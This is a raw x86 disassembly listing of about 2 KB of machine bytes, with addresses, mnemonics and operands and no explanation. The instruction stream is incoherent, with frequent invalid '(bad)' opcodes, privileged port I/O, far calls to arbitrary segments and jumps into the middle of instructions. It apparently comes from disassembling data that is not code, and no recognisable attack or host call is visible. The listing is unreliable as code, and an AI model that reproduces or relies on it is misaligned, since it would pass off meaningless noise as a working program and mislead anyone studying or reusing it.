  4420f4:	enter  0x5100,0xb1
  4420f8:	test   DWORD PTR [esi],0xa3b2f2dc
  4420fe:	enter  0x603d,0x72
  442102:	shl    BYTE PTR ds:0xecf50b9d,0xdc
  442109:	lods   eax,DWORD PTR ds:[esi]
  44210a:	out    0x59,eax
  44210c:	mov    edi,0x13939ab3
  442111:	jmp    DWORD PTR [edx+eax*8-0x68f83733]
  442118:	stos   BYTE PTR es:[edi],al
  442119:	or     BYTE PTR [eax-0x49],ch
  44211c:	jge    0x4420f3
  44211e:	pop    edx
  44211f:	repz jo 0x442179
  442122:	adc    al,0x92
  442124:	xor    cl,BYTE PTR [eax+eax*8]
  442127:	cmp    edx,DWORD PTR [ebx]
  442129:	push   ebp
  44212a:	shl    BYTE PTR [edi+0x3e3cf8bf],cl
  442130:	mov    bl,0x47
  442132:	popa   
  442133:	sub    eax,0x3c65c001
  442138:	jbe    0x442154
  44213a:	je     0x4420e3
  44213c:	and    ecx,edx
  44213e:	jg     0x442113
  442140:	inc    ecx
  442141:	mov    dl,0xa2
  442143:	std    
  442144:	pop    eax
  442145:	add    BYTE PTR [edx-0x4719df86],bl
  44214b:	call   0x4d68:0xa78bf2a7
  442152:	sbb    ch,0xcf
  442155:	cmp    al,0x4e
  442157:	aaa    
  442158:	mov    dl,0x4f
  44215a:	and    DWORD PTR [ebx+edi*8-0x4be8d75d],esi
  442161:	or     al,dl
  442163:	adc    BYTE PTR [esp+eax*8-0x44],al
  442167:	jo     0x442193
  442169:	repz sar DWORD PTR [esi],1
  44216c:	mov    dl,0xcc
  44216e:	jbe    0x44211d
  442170:	out    0x8f,eax
  442172:	mov    BYTE PTR [edx+0x43e20b9c],dh
  442178:	xchg   esp,eax
  442179:	or     al,0x44
  44217b:	pop    eax
  44217c:	(bad)  
  44217d:	enter  0x5a99,0xdc
  442181:	imul   esp,DWORD PTR [edi],0x38933202
  442187:	das    
  442188:	in     eax,dx
  442189:	loope  0x442119
  44218b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44218c:	je     0x4421aa
  44218e:	jp     0x44218d
  442190:	out    dx,al
  442191:	(bad)  
  442192:	aad    0xc7
  442194:	mov    ebx,0x24de9d5b
  442199:	mov    ecx,DWORD PTR [esi+0x2d]
  44219c:	sahf   
  44219d:	es xchg edx,eax
  44219f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4421a0:	idiv   dl
  4421a2:	dec    ebp
  4421a3:	jnp    0x442174
  4421a5:	in     al,dx
  4421a6:	inc    esp
  4421a7:	jae    0x442218
  4421a9:	sub    ebx,DWORD PTR [edx+0x70704c0]
  4421af:	ins    DWORD PTR es:[edi],dx
  4421b0:	in     al,dx
  4421b1:	and    esp,DWORD PTR ds:0x142f3ea7
  4421b7:	mov    esp,0xacc09c9e
  4421bc:	mov    WORD PTR [ecx],cs
  4421be:	loop   0x442195
  4421c0:	mov    dl,0x76
  4421c2:	pop    ebx
  4421c3:	inc    ebp
  4421c4:	mov    esi,db4
  4421c7:	jo     0x4421ba
  4421c9:	or     eax,DWORD PTR [edx+0x15]
  4421cc:	push   ds
  4421cd:	xchg   esp,eax
  4421ce:	imul   esi,DWORD PTR [ecx],0x6e
  4421d1:	inc    edx
  4421d2:	call   0xd259:0x12659a4a
  4421d9:	pop    esi
  4421da:	jg     0x442183
  4421dc:	rcl    DWORD PTR [edi+0x17f08d32],cl
  4421e2:	test   al,0x9b
  4421e4:	mov    dl,0xd3
  4421e6:	push   edi
  4421e7:	jle    0x4421a0
  4421e9:	xor    DWORD PTR [ebp-0x71],eax
  4421ec:	in     eax,dx
  4421ed:	or     ecx,DWORD PTR [eax]
  4421ef:	stos   DWORD PTR es:[edi],eax
  4421f0:	stc    
  4421f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4421f2:	aad    0xe6
  4421f4:	jbe    0x4421b7
  4421f6:	bound  esi,QWORD PTR [esi]
  4421f8:	mov    esp,0xf047360
  4421fd:	mov    eax,DWORD PTR [esi-0x6c]
  442200:	sub    BYTE PTR [ebp-0x5e9258ee],dl
  442206:	lods   eax,DWORD PTR ds:[esi]
  442207:	iret   
  442208:	out    0x8e,al
  44220a:	xchg   esp,eax
  44220b:	inc    ebp
  44220c:	mov    dl,0x69
  44220e:	pop    es
  44220f:	(bad)  
  442210:	lea    edx,[edi]
  442212:	nop
  442213:	ds and eax,0xcd4e680b
  442219:	ret    
  44221a:	add    bl,bl
  44221c:	sub    al,0x8e
  44221e:	popf   
  44221f:	jmp    0x6c01c252
  442224:	cmc    
  442225:	fstp   TBYTE PTR [edx]
  442227:	inc    ebp
  442228:	adc    al,0xbe
  44222a:	add    eax,0xa454f9a7
  44222f:	lods   al,BYTE PTR ds:[esi]
  442230:	(bad)  
  442231:	mov    esp,0x585c5317
  442236:	jbe    0x442220
  442238:	mov    dl,0x23
  44223a:	adc    al,0xf1
  44223c:	outs   dx,DWORD PTR ds:[esi]
  44223d:	sbb    al,0x80
  44223f:	rol    ah,cl
  442241:	dec    DWORD PTR [esi+0x7038b0a7]
  442247:	lods   eax,DWORD PTR ds:[esi]
  442248:	loop   0x442280
  44224a:	push   ebx
  44224b:	or     al,0xb2
  44224d:	mov    esp,0x6b949316
  442252:	cs pop eax
  442254:	outs   dx,DWORD PTR ds:[esi]
  442255:	or     edx,edi
  442257:	add    DWORD PTR [esi-0x4b01685f],ebp
  44225d:	sti    
  44225e:	call   0x9db7:0x7ebaf530
  442265:	sahf   
  442266:	out    dx,eax
  442267:	fwait
  442268:	dec    edi
  442269:	adc    BYTE PTR [edx],bl
  44226b:	test   ebx,esp
  44226d:	ret    
  44226e:	pop    edi
  44226f:	jle    0x442292
  442271:	fistp  WORD PTR [edx-0x1203e32f]
  442277:	das    
  442278:	out    dx,al
  442279:	lds    esi,FWORD PTR [esi+0x476c38a7]
  44227f:	mov    bl,0xf5
  442281:	or     DWORD PTR [ecx],esp
  442283:	push   0xa7da7bea
  442288:	test   eax,0x1ee1bd85
  44228d:	lahf   
  44228e:	(bad)  
  44228f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442290:	dec    esi
  442291:	and    bl,0x42
  442294:	std    
  442295:	enter  0x8a2c,0xb2
  442299:	mov    BYTE PTR [ebx],cl
  44229b:	iret   
  44229c:	outs   dx,DWORD PTR ds:[esi]
  44229d:	stc    
  44229e:	sti    
  44229f:	inc    eax
  4422a0:	stos   DWORD PTR es:[edi],eax
  4422a1:	or     esp,DWORD PTR [edx-0x70]
  4422a4:	test   eax,0x4e9bfd46
  4422a9:	jmp    0x442244
  4422ab:	mov    cl,0x89
  4422ad:	mov    dl,0x59
  4422af:	sbb    ebx,ecx
  4422b1:	repz mov ecx,0x4a0c5d43
  4422b7:	sub    BYTE PTR [eax+0x5a8773b9],dh
  4422bd:	xor    BYTE PTR [eax-0x1c2f4d82],al
  4422c3:	call   0x8aed3809
  4422c8:	mov    BYTE PTR [edi],dl
  4422ca:	repz inc ecx
  4422cc:	xchg   ebx,eax
  4422cd:	push   ebp
  4422ce:	add    eax,0x142e47e7
  4422d3:	add    al,0x89
  4422d5:	sti    
  4422d6:	call   0x5d9f:0xf4b27380
  4422dd:	and    DWORD PTR [edx-0x59],edx
  4422e0:	retf   
  4422e1:	adc    eax,0x825fc83d
  4422e6:	inc    esp
  4422e7:	repnz mov dl,0xe2
  4422ea:	(bad)  
  4422eb:	retf   0x7971
  4422ee:	jmp    0xcb4f9ce2
  4422f3:	mov    edi,0xbb02397
  4422f8:	mov    cl,0xca
  4422fa:	call   0x50b0:0x59cb5ccf
  442301:	iret   
  442302:	or     al,0xd1
  442304:	xchg   ecx,eax
  442305:	or     ebx,DWORD PTR ds:0x150ea3fa
  44230b:	fldenv [ecx+0x2eed9a72]
  442311:	dec    ebx
  442312:	out    0x90,al
  442314:	ss push esp
  442316:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  442318:	adc    ebp,0xffffffc7
  44231b:	mov    bh,0x33
  44231d:	dec    ecx
  44231e:	pop    ebp
  44231f:	outs   dx,BYTE PTR ds:[esi]
  442320:	and    al,BYTE PTR [ecx-0x79]
  442323:	or     DWORD PTR [edi-0x54],edx
  442326:	fwait
  442327:	ss and ch,bl
  44232a:	mov    ds:0xe9ad7e5e,al
  44232f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442330:	out    0xbc,eax
  442332:	push   edx
  442333:	call   0xa6ae:0x6d611fe2
  44233a:	mov    ah,0x19
  44233c:	and    eax,0x8bdc9a54
  442341:	sbb    al,0xfe
  442343:	aad    0xa1
  442345:	or     BYTE PTR [ecx+0x4ac971b8],al
  44234b:	dec    DWORD PTR [ebx]
  44234d:	stos   DWORD PTR es:[edi],eax
  44234e:	ins    BYTE PTR es:[edi],dx
  44234f:	push   ebx
  442350:	pop    edi
  442351:	ds call 0xe215:0xce78e771
  442359:	out    0x81,eax
  44235b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44235c:	push   ds
  44235d:	scas   al,BYTE PTR es:[edi]
  44235e:	sar    DWORD PTR [eax-0x5ffcc31c],1
  442364:	mov    ch,0x2c
  442366:	inc    ebx
  442367:	cdq    
  442368:	push   edx
  442369:	into   
  44236a:	jmp    0x5fa7:0xc4b45afe
  442371:	rol    DWORD PTR [esi],0xcf
  442374:	jne    0x4422f6
  442376:	arpl   sp,bp
  442378:	mov    dl,0xf7
  44237a:	je     0x4423ad
  44237c:	xchg   edi,eax
  44237d:	jno    0x4423c2
  44237f:	call   0x3c56:0x112a0573
  442386:	mov    ch,0xbb
  442388:	ror    BYTE PTR [edx-0x1f4fedf9],cl
  44238e:	call   0x9255:0x5f613525
  442395:	xor    bl,dh
  442397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442398:	xlat   BYTE PTR ds:[ebx]
  442399:	push   ecx
  44239a:	fcom   QWORD PTR [eax+edi*2]
  44239d:	inc    ecx
  44239e:	stos   BYTE PTR es:[edi],al
  44239f:	dec    esi
  4423a0:	int    0xe6
  4423a2:	call   0x4507:0x253fa75e
  4423a9:	push   cs
  4423aa:	das    
  4423ab:	aaa    
  4423ac:	add    BYTE PTR [ebx],cl
  4423ae:	in     eax,dx
  4423af:	fdiv   DWORD PTR [edx]
  4423b1:	jno    0x4423e1
  4423b3:	fldcw  WORD PTR [ecx]
  4423b5:	aam    0x9a
  4423b7:	and    BYTE PTR [ebx+0x723f2c0a],ah
  4423bd:	(bad)  
  4423bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4423c0:	pop    esi
  4423c1:	call   0xe2ad:0x915a6b3a
  4423c8:	sar    edi,0x9a
  4423cb:	mov    ?,ecx
  4423cd:	mov    ecx,0xcdfd520c
  4423d2:	sbb    DWORD PTR [eax-0x5575ce80],esp
  4423d8:	mov    DWORD PTR [esi+0x29bc6718],ebx
  4423de:	xchg   BYTE PTR [eax],dh
  4423e0:	mov    dl,0xdc
  4423e2:	cmp    eax,0x28f01f65
  4423e7:	in     al,0x3f
  4423e9:	jp     0x442454
  4423eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4423ec:	ror    al,1
  4423ee:	stos   DWORD PTR es:[edi],eax
  4423ef:	mov    eax,ds:0xd3dea0a6
  4423f4:	mov    cl,0xf6
  4423f6:	jp     0x442474
  4423f8:	inc    edi
  4423f9:	ds push esp
  4423fb:	js     0x2a7b8eeb
  442401:	push   DWORD PTR [eax+0x7e0b29d9]
  442407:	sub    ch,ch
  442409:	sahf   
  44240a:	or     eax,0x9a78c994
  44240f:	mov    esi,0x68134a32
  442414:	jmp    0x4423c2
  442416:	adc    DWORD PTR [eax+0x1e02db85],edi
  44241c:	xor    bl,BYTE PTR [edx+0x5f]
  44241f:	js     0x4423b0
  442421:	ins    BYTE PTR es:[edi],dx
  442422:	loop   0x4423ef
  442424:	pop    esi
  442425:	mov    bh,0x95
  442427:	mov    eax,0x27dcd0e7
  44242c:	dec    edi
  44242d:	ret    
  44242e:	cmp    al,0x2e
  442430:	aam    0x4
  442432:	js     0x44245a
  442434:	xchg   esi,eax
  442435:	push   ds
  442436:	jp     0x4423d2
  442438:	pop    ds
  442439:	lods   al,BYTE PTR ds:[esi]
  44243a:	lds    eax,FWORD PTR [edi+0x642abac9]
  442440:	mov    dl,0x2a
  442442:	out    dx,eax
  442443:	push   edx
  442444:	and    BYTE PTR [ecx+0x34d1bd05],bh
  44244a:	mov    bh,BYTE PTR [edi]
  44244c:	xor    dl,BYTE PTR [eax+0x26]
  44244f:	fcom   QWORD PTR [edi]
  442451:	test   DWORD PTR [ecx+0x4d],ecx
  442454:	mov    ch,0x97
  442456:	ja     0x442484
  442458:	jg     0x44246d
  44245a:	(bad)  
  44245b:	jecxz  0x44242f
  44245d:	and    al,0x5d
  44245f:	push   edi
  442460:	mov    ds:0x3367850b,eax
  442465:	jge    0x44241a
  442467:	push   eax
  442468:	xchg   ecx,eax
  442469:	test   al,0xb6
  44246b:	out    dx,eax
  44246c:	jbe    0x442400
  44246e:	call   0xdafc:0xf4129094
  442475:	or     ebp,DWORD PTR [esi]
  442477:	cs (bad) 
  442479:	sub    ecx,DWORD PTR ds:0x9a45158c
  44247f:	xchg   ecx,eax
  442480:	add    eax,0xb4f0065d
  442485:	push   ebp
  442486:	jnp    0x44242f
  442488:	pop    eax
  442489:	push   0x53cd7fd
  44248e:	lds    esp,FWORD PTR [esi-0x1a113d4e]
  442494:	jns    0x44249a
  442496:	jne    0x4424cc
  442498:	pop    ds
  442499:	or     dl,BYTE PTR [ecx]
  44249b:	fist   DWORD PTR [edi+ecx*4]
  44249e:	add    DWORD PTR [eax-0x289507bb],ebx
  4424a4:	adc    eax,DWORD PTR [ebp-0x4e07147a]
  4424aa:	fidivr DWORD PTR [eax+0x3f]
  4424ad:	lds    eax,FWORD PTR [edi]
  4424af:	mov    edx,0xe7e70be7
  4424b4:	add    bh,dh
  4424b6:	add    edi,DWORD PTR fs:[ebx]
  4424b9:	ficomp WORD PTR [edx+0x6ced9819]
  4424bf:	dec    edx
  4424c0:	pop    esp
  4424c1:	dec    edx
  4424c2:	das    
  4424c3:	pop    ds
  4424c4:	xchg   ebx,eax
  4424c5:	pop    ss
  4424c6:	mov    dh,0x3c
  4424c8:	xor    esi,DWORD PTR [eax-0x3dca0166]
  4424ce:	popa   
  4424cf:	ja     0x442472
  4424d1:	mov    al,0x2a
  4424d3:	mov    al,0xb1
  4424d5:	pop    ds
  4424d6:	sti    
  4424d7:	cmp    DWORD PTR [eax-0x6e],ebx
  4424da:	stos   DWORD PTR es:[edi],eax
  4424db:	jg     0x44253b
  4424dd:	outs   dx,BYTE PTR ds:[esi]
  4424de:	shl    BYTE PTR [edi+0x3fc42107],cl
  4424e4:	and    al,0xf2
  4424e6:	sub    ebp,DWORD PTR [ecx-0x4e]
  4424e9:	inc    eax
  4424ea:	mov    eax,0xdaa5dc8e
  4424ef:	mov    WORD PTR [ebx+0xa],es
  4424f2:	mov    ebp,0x8112e682
  4424f7:	pop    ecx
  4424f8:	cmc    
  4424f9:	cmp    ebx,DWORD PTR [eax]
  4424fb:	xor    DWORD PTR [edx-0x6c6bd29c],0x5002b8e7
  442505:	or     esp,DWORD PTR [ecx*8+0x6f69e26b]
  44250c:	xor    ch,BYTE PTR [ebx-0x4c293a66]
  442512:	cmp    BYTE PTR [ebx],dl
  442514:	pop    edi
  442515:	jns    0x442552
  442517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442518:	mov    cs,esp
  44251a:	mov    al,ds:0x6a4b9eec
  44251f:	ja     0x442578
  442521:	cld    
  442522:	xchg   BYTE PTR ds:0x5bda6e40,cl
  442528:	jle    0x442546
  44252a:	test   eax,0xdc0f2bd5
  44252f:	outs   dx,DWORD PTR ds:[esi]
  442530:	(bad)  [eax+ecx*1+0x27]
  442534:	sti    
  442535:	int    0x44
  442537:	sub    BYTE PTR [ebp+0x540426d1],dh
  44253d:	mov    DWORD PTR [edx-0x7d],ebx
  442540:	jp     0x44255c
  442542:	dec    ecx
  442543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442544:	jne    0x44257a
  442546:	mov    edx,0x466c011a
  44254b:	test   eax,0xdb9a1b02
  442550:	mov    ebp,0xe4a9776
  442555:	jnp    0x4424d7
  442557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442558:	adc    esp,DWORD PTR [esi-0x61]
  44255b:	push   ecx
  44255c:	rol    BYTE PTR [edx-0x4fa55b8d],cl
  442562:	call   0xf6c:0xd6a22c11
  442569:	sbb    al,ah
  44256b:	rcl    ecx,cl
  44256d:	jb     0x4425bb
  44256f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442570:	(bad)
  442574:	sub    ecx,eax
  442576:	mov    al,ds:0x2b01b261
  44257b:	sbb    DWORD PTR ds:0x64e288e1,0xb
  442582:	push   ds
  442583:	stc    
  442584:	imul   ecx,DWORD PTR [ecx],0xf98182e4
  44258a:	pushf  
  44258b:	mov    WORD PTR [esi-0x45a999aa],?
  442591:	add    ah,BYTE PTR [edi-0x1]
  442594:	dec    BYTE PTR [edx+0x1a]
  442597:	(bad)  
  442598:	stos   DWORD PTR es:[edi],eax
  442599:	sar    DWORD PTR [eax+0x1f7ab50b],0xcc
  4425a0:	lgs    edx,FWORD PTR [ebp+eax*1-0x6b]
  4425a5:	xlat   BYTE PTR ds:[ebx]
  4425a6:	cmp    DWORD PTR [edi-0x52],eax
  4425a9:	and    ah,BYTE PTR [eax-0x104e3f59]
  4425af:	ret    
  4425b0:	jmp    0x93db:0xb26c2d50
  4425b7:	dec    ebp
  4425b8:	pop    ds
  4425b9:	and    al,0xf9
  4425bb:	mov    eax,0x6bc330f7
  4425c0:	sbb    al,0xb2
  4425c2:	sbb    al,0xa3
  4425c4:	pop    es
  4425c5:	adc    eax,0xe23e6788
  4425ca:	iret   
  4425cb:	out    dx,al
  4425cc:	ret    0x9a77
  4425cf:	dec    eax
  4425d0:	and    esp,DWORD PTR [ecx+0x53484c77]
  4425d6:	pop    ebp
  4425d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4425d8:	lahf   
  4425d9:	into   
  4425da:	adc    bl,cl
  4425dc:	popf   
  4425dd:	xchg   ecx,eax
  4425de:	xchg   esi,eax
  4425df:	sbb    dl,dl
  4425e1:	push   edi
  4425e2:	jp     0x44263b
  4425e4:	inc    edi
  4425e5:	mov    eax,0x1daaa7e3
  4425ea:	xchg   BYTE PTR [ecx],cl
  4425ec:	aas    
  4425ed:	pop    ebx
  4425ee:	cld    
  4425ef:	retf   
  4425f0:	mov    dl,0x1c
  4425f2:	jmp    0x44257d
  4425f4:	push   edi
  4425f5:	mov    ds:0x78a12cfd,al
  4425fa:	fldenv [eax-0x2b8a5313]
  442600:	outs   dx,BYTE PTR ds:[esi]
  442601:	sti    
  442602:	jb     0x442658
  442604:	mov    bh,0xc0
  442606:	call   0x6d2a:0x7da52bea
  44260d:	mov    ebp,0x831a732
  442612:	aam    0x8a
  442614:	jno    0x4425ec
  442616:	inc    esp
  442617:	stc    
  442618:	mov    dl,0x8b
  44261a:	fisub  WORD PTR ds:0x2d289801
  442620:	mov    gs,WORD PTR [edi]
  442622:	int    0xe0
  442624:	pop    es
  442625:	or     edx,DWORD PTR [ecx+0x53]
  442628:	data16 ficomp DWORD PTR [ebx]
  44262b:	push   es
  44262c:	mov    dl,0x86
  44262e:	das    
  44262f:	jmp    0x2339c8d1
  442634:	iret   
  442635:	or     edx,DWORD PTR [edi-0x2b]
  442638:	or     eax,0x723d51e6
  44263d:	xor    bl,BYTE PTR [edx+0x4843d1d7]
  442643:	mov    ds:0xba14ca4d,al
  442648:	cs (bad) 
  44264a:	and    DWORD PTR [edi],0x22432246
  442650:	add    al,0xb5
  442652:	lea    ebp,[edx]
  442654:	imul   edx,DWORD PTR [edi],0x65c0cf9a
  44265a:	push   0x42
  44265c:	ja     0x442669
  44265e:	sbb    DWORD PTR [eiz*1-0x169ae306],edi
  442665:	add    eax,esi
  442667:	xchg   esp,eax
  442668:	sub    BYTE PTR [edx+ebx*4+0x6a],dh
  44266c:	xlat   BYTE PTR ds:[ebx]
  44266d:	aam    0xfe
  44266f:	adc    eax,0xa7087bdd
  442674:	add    al,0x27
  442676:	out    dx,al
  442677:	sub    BYTE PTR [esi-0x52],al
  44267a:	std    
  44267b:	cli    
  44267c:	scas   al,BYTE PTR es:[edi]
  44267d:	cmp    cl,bh
  44267f:	mov    dl,0x73
  442681:	xor    al,0x85
  442683:	push   ss
  442684:	int3   
  442685:	jae    0x4426dd
  442687:	push   edx
  442688:	or     ebx,DWORD PTR es:[eax]
  44268b:	sti    
  44268c:	mov    ah,0xe7
  44268e:	aas    
  44268f:	jmp    0x53a8:0xdd9a7254
  442696:	ins    BYTE PTR es:[edi],dx
  442697:	xor    BYTE PTR [edi+0x33],ch
  44269a:	push   edi
  44269b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44269c:	(bad)  
  44269d:	retf   
  44269e:	into   
  44269f:	ja     0x442690
  4426a1:	inc    edi
  4426a2:	in     eax,dx
  4426a3:	test   DWORD PTR [edx-0x44538741],esi
  4426a9:	mov    esp,0xb1370a1
  4426ae:	sub    al,al
  4426b0:	pop    ss
  4426b1:	mov    dl,0x4f
  4426b3:	frstor [ecx+ebp*1]
  4426b6:	mov    ?,eax
  4426b8:	jne    0x442733
  4426ba:	addr16 mov ch,0x8
  4426bd:	retf   0xa425
  4426c0:	inc    ebp
  4426c1:	ja     0x44266b
  4426c3:	cmp    ch,BYTE PTR fs:[ecx+0x25b21e03]
  4426ca:	sub    eax,0x36afa992
  4426cf:	test   DWORD PTR [ebx+0x71],0xc541a657
  4426d6:	test   eax,0xcf6e9688
  4426db:	ja     0x44268c
  4426dd:	stos   DWORD PTR es:[edi],eax
  4426de:	call   0x8314:0x4d8fbd66
  4426e5:	pop    edx
  4426e6:	push   edi
  4426e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4426e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4426e9:	sti    
  4426ea:	pop    ds
  4426eb:	mov    eax,eax
  4426ed:	aaa    
  4426ee:	xlat   BYTE PTR ds:[ebx]
  4426ef:	sahf   
  4426f0:	(bad)  
  4426f1:	and    BYTE PTR [edx+0x7e2d2e65],bl
  4426f7:	mov    dl,0xe7
  4426f9:	outs   dx,BYTE PTR ds:[esi]
  4426fa:	ret    0xa13f
  4426fd:	add    eax,0xc3ed3c4d
  442702:	in     al,0xe7
  442704:	mov    cl,BYTE PTR [esi+0x6d]
  442707:	jp     0x442773
  442709:	mov    bl,0x9a
  44270b:	mov    esp,ecx
  44270d:	xchg   esp,eax
  44270e:	add    DWORD PTR [ebx+eiz*8-0x415ab47c],0xab3db3ae
  442719:	or     dl,bh
  44271b:	lods   al,BYTE PTR ds:[esi]
  44271c:	(bad)  
  44271d:	in     eax,0xe8
  44271f:	loopne 0x4426d3
  442721:	icebp  
  442722:	and    al,0x72
  442724:	scas   al,BYTE PTR es:[edi]
  442725:	scas   eax,DWORD PTR es:[edi]
  442726:	outs   dx,DWORD PTR ds:[esi]
  442727:	sub    al,0x96
  442729:	add    al,0xfe
  44272b:	jno    0x44271e
  44272d:	adc    eax,0xc1fc7a7a
  442732:	dec    eax
  442733:	and    BYTE PTR [ecx+0x56c95550],dh
  442739:	popf   
  44273a:	ins    DWORD PTR es:[edi],dx
  44273b:	pop    edi
  44273c:	or     dh,ch
  44273e:	cwde   
  44273f:	push   ebp
  442740:	push   cs
  442741:	or     ebp,DWORD PTR [edx]
  442743:	cmp    BYTE PTR [ebx+0x2e2f9964],0xe7
  44274a:	bound  edx,QWORD PTR [edx+esi*4]
  44274d:	xchg   esi,eax
  44274e:	or     al,0x6b
  442750:	mov    al,0x31
  442752:	ja     0x4427b9
  442754:	mov    WORD PTR [edx],es
  442756:	sub    eax,edi
  442758:	hlt    
  442759:	push   0x54ba921d
  44275e:	mov    edx,0xdebea651
  442763:	inc    ecx
  442764:	mov    dl,0xa1
  442766:	jp     0x442768
  442768:	mov    dh,0x90
  44276a:	stos   BYTE PTR es:[edi],al
  44276b:	daa    
  44276c:	jns    0x44279e
  44276e:	fldenv ds:0xb20df6b2
  442774:	mov    ah,0xca
  442776:	(bad)  
  442777:	popa   
  442778:	mov    dl,0xeb
  44277a:	lods   al,BYTE PTR ds:[esi]
  44277b:	mov    al,0xb5
  44277d:	outs   dx,DWORD PTR ds:[esi]
  44277e:	imul   esp,DWORD PTR [ebx-0x1d6fb884],0x40a46db2
  442788:	xor    DWORD PTR [ecx],edx
  44278a:	cmp    bp,WORD PTR [ecx+ecx*1+0xd65a800]
  442792:	call   0xab84:0x7656d108
  442799:	or     ebp,DWORD PTR [edx]
  44279b:	dec    edx
  44279c:	sahf   
  44279d:	mov    dh,BYTE PTR [eax]
  44279f:	mov    esp,0x319a4fa6
  4427a4:	xor    al,0xf2
  4427a6:	adc    eax,0x7494d04
  4427ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4427ac:	imul   edi,DWORD PTR [esp+eiz*4-0x36],0xadd93836
  4427b4:	mov    dl,0xd8
  4427b6:	push   cs
  4427b7:	cmc    
  4427b8:	shl    DWORD PTR [ecx],0x84
  4427bb:	js     0x4427fd
  4427bd:	or     edi,DWORD PTR [eax+0x4c]
  4427c0:	cmp    ah,BYTE PTR [esi-0x11]
  4427c3:	out    0x4,eax
  4427c5:	mov    bl,BYTE PTR [edx-0x50e9f077]
  4427cb:	sub    al,0x7d
  4427cd:	jbe    0x44281f
  4427cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4427d0:	add    ch,BYTE PTR [edi]
  4427d2:	lds    esp,FWORD PTR [ebx-0x2f]
  4427d5:	jae    0x442792
  4427d7:	shl    BYTE PTR [edx+0x5cf900ce],1
  4427dd:	shl    DWORD PTR [ebp+0x570b4a7c],1
  4427e3:	push   ecx
  4427e4:	push   esp
  4427e5:	sbb    ebx,DWORD PTR [esi+0x60]
  4427e8:	inc    edi
  4427e9:	xchg   edx,eax
  4427ea:	fwait
  4427eb:	(bad)  
  4427ec:	es in  al,dx
  4427ee:	stos   BYTE PTR es:[edi],al
  4427ef:	jle    0x44285f
  4427f1:	fdiv   DWORD PTR [ebp-0x4b3912b9]
  4427f7:	sub    DWORD PTR [ecx+0x34869ae7],edi
  4427fd:	mov    al,ds:0xf7fe1a0b
  442802:	sub    ah,BYTE PTR [edi+0x71ae81cf]
  442808:	es add ebx,ecx
  44280b:	cmp    BYTE PTR [ecx+ebx*8+0xc925c3f],bh
  442812:	ss test al,0xc2
  442815:	aaa    
  442816:	rol    DWORD PTR [ebp-0x27dbf43b],0x20
  44281d:	leave  
  44281e:	cmp    eax,0x864d0707
  442823:	jle    0x4427aa
  442825:	pop    ebx
  442826:	pop    edx
  442827:	les    ecx,FWORD PTR [ecx+0x60]
  44282a:	or     esp,edi
  44282c:	jl     0x44284b
  44282e:	popf   
  44282f:	pop    ecx
  442830:	mov    ds:0x79f08f0b,eax
  442835:	cmp    edx,esi
  442837:	jge    0x4427eb
  442839:	idiv   BYTE PTR [edi]
  44283b:	or     BYTE PTR [ebx],bl
  44283d:	adc    BYTE PTR [ecx+0xc0cc69c],cl
  442843:	xchg   edx,eax
  442844:	ss out dx,eax
  442846:	pop    esp
  442847:	aaa    
  442848:	gs repz xchg ah,ch
  44284c:	lea    ecx,[edx+0x1538276d]
  442852:	push   ebp
  442853:	(bad)
  442857:	pushf  
  442858:	mov    eax,eax
  44285a:	pop    es
  44285b:	cld    
  44285c:	fmul   st(3),st
  44285e:	cmp    al,0x16
  442860:	xor    DWORD PTR [ecx+0x42b2461c],eax
  442866:	fdiv   st(6),st
  442868:	fnsave [esi+0x3d]
  44286b:	test   BYTE PTR [esi+0x71130e0b],bl
  442871:	cmp    al,0x5f
  442873:	es out 0x21,al
  442876:	call   0x6218:0x35072cb1
  44287d:	stc    
  44287e:	inc    ebx
  44287f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442880:	shl    bh,1
  442882:	das    
  442883:	sub    eax,0x98798c55
  442888:	mov    dl,0x5f
  44288a:	add    BYTE PTR [ebx-0x3b1749eb],dl
  442890:	jb     0x442902
  442892:	gs pop ebp
  442894:	mov    cl,BYTE PTR [ebx]
  442896:	sar    BYTE PTR [edx+0x21],1
  442899:	ins    DWORD PTR es:[edi],dx
  44289a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44289b:	sub    bh,BYTE PTR [ebp+0x77ef9aa7]
  4428a1:	sbb    ch,BYTE PTR [edi+0x5cb3a56f]
  4428a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4428a8:	cdq    
  4428a9:	cmp    BYTE PTR [eax-0x490957e7],0xbe
  4428b0:	mov    dl,0x83
  4428b2:	out    0xff,eax
  4428b4:	es dec bp
  4428b7:	rcr    DWORD PTR [ebp+0x735f181f],cl
  4428bd:	shl    BYTE PTR [edi+0x1f3445ef],1
  4428c3:	ja     0x44290a
  4428c5:	or     edx,DWORD PTR [edi]
  4428c7:	or     eax,0xad933bc5
  4428cc:	and    DWORD PTR [ebx-0x9d96966],0x4aa5142f
  4428d6:	pop    esp
  4428d7:	scas   al,BYTE PTR es:[edi]
  4428d8:	mov    ecx,0xb2308e4f
  4428dd:	jmp    FWORD PTR [ebp-0x7775d2ba]
  4428e3:	inc    edi
  4428e4:	fwait
  4428e5:	mov    eax,ds:0x2d22059d
  4428ea:	jmp    0x8bdfc956
  4428ef:	rcr    BYTE PTR [esp+eax*1+0x476adbdf],1
  4428f6:	dec    esi
